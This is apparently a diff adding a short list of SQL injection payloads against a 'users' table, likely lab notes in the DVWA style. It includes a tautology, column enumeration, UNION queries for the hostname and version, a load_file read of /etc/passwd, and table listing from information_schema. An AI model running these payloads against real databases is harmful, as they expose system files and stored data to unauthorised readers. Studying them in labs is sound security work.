@@ -1,0 +1,15 @@
+SELECT first_name, last_name FROM users WHERE user_id = '1'
+
+SELECT first_name, last_name FROM users WHERE user_id = ‘1' or '1'='1’
+
+SELECT first_name, last_name FROM users WHERE user_id = 'a' ORDER BY 1;#'
+
+SELECT first_name, last_name FROM users WHERE user_id = ' ' union select
+null,@@hostname#'
+
+SELECT first_name, last_name FROM users WHERE user_id = ' ' union select
+load_file('/etc/passwd'),null#'
+
+1 or 1=1 union select null, table_name from information_schema.tables#
+
+1 union select null,@@version#
